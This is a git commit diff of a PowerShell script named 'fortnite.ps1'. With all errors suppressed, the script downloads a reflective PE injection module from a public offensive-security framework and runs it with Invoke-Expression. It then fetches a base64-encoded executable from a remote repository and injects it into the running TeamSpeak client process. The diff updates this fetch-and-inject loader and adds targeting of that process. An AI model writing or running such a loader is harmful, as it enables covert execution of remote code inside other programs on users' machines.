569f29fdcec29b2e662c5e6605fbf6ac3dd05987
spritezerosugar67 <apfelgamer1@gmail.com>
2026-01-08 19:31:26 +0100

    Update fortnite.ps1

--- fortnite.ps1
+++ fortnite.ps1
@@ -1,24 +1,21 @@
 $ErrorActionPreference = 'SilentlyContinue'
 
-while (!(Get-Process ts3client_win64)) { 
-    Start-Sleep -Seconds 2 
-}
-
 Start-Sleep -Seconds 5 
 
 try {
     [Net.ServicePointManager]::SecurityProtocol = 3072
-    $wc = New-Object System.Net.WebClient
     
-    $l = $wc.DownloadString("https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-ReflectivePEInjection.ps1")
-    Invoke-Expression $l
+    $loaderUrl = "https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/management/Invoke-ReflectivePEInjection.ps1"
+    $loaderContent = (iwr -UseBasicParsing $loaderUrl).Content
+    Invoke-Expression $loaderContent
 
-    $b = $wc.DownloadString("https://raw.githubusercontent.com/spritezerosugar67/johannesschwein/refs/heads/main/johannesschwein.txt")
-    $rb = [System.Convert]::FromBase64String($b)
+    $exeUrl = "https://raw.githubusercontent.com/dein-user/dein-repo/main/johannesschwein.txt"
+    $base64String = (iwr -UseBasicParsing $exeUrl).Content
+    
+    $peBytes = [System.Convert]::FromBase64String($base64String)
 
-    Invoke-ReflectivePEInjection -PEBytes $rb -ForceASLR
+    $target = Get-Process ts3client_win64
+    Invoke-ReflectivePEInjection -PEBytes $peBytes -ProcId $target.Id -ForceASLR
 } catch {
-}
 
-# Khiro wer das liest LG
-exit
+}
